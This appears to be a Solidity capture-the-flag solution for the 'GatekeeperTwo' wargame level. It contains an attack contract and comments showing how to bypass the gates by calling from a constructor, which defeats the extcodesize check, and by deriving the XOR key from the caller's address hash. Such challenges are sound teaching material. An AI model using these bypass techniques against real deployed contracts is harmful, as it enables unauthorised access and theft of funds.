// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {GatekeeperTwo} from "../src/GatekeeperTwo.sol";


contract Attack {
    constructor(GatekeeperTwo gateKeeperTwo) {
        attack(gateKeeperTwo);
    }

    function attack(GatekeeperTwo gateKeeperTwo) public {
        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        (bool success, ) = address(gateKeeperTwo).call(abi.encodeWithSignature("enter(bytes8)", _gateKey));
        require(success, "Attack failed");

    }
}
    // GateOne Requierment
    // Call from another contract

    // GateTwo Requierment
    // The extcodesize opcode returns the size of the code at the given address, caller() here. If the address is a contract, 
    // it will return the size of the contract's code. If the address is an EOA (Externally Owned Account), it will return 0.
    // Size of caller must be zero but our contract is not 
    // Solution is to execute the call from the constructor function making the contract not yet deployed hence x is returned zero


    // gateThree Requirement
    //  modifier gateThree(bytes8 _gateKey) {
    //     require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    //     _;
    // }

    // A = uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))
    // B = uint64(_gateKey)
    // C = type(uint64).max

    // A ^ B = C 
    // making B subject
    // B = A ^ C
    // uint64(_gateKey) =  uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max
    // bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max)



